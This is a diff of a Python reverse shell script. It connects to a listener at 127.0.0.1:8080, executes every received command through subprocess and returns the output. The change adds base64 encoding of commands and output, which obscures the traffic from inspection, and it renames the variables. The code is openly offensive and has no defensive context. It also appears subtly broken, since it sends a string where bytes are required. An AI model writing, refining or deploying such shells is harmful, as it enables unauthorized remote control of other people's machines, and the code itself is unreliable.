@@ -1,19 +1,19 @@
-import socket, subprocess, os
+import socket, subprocess, os, base64
 
 HOST = '127.0.0.1'
 PORT = 8080
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 s.connect((HOST, PORT))
 
 while True:
-    command = s.recv(1024).decode()
+    c = s.recv(1024).decode()
+    if c.strip() == "exit": break
     
-    if command.strip() == "exit":
-        break
+    c = base64.b64decode(c.encode()).decode()
     
-    output = subprocess.getoutput(command)
-    s.send(output.encode())
+    o = subprocess.getoutput(c)
+
+    s.send(base64.b64encode(o.encode()).decode())
 
 s.close()
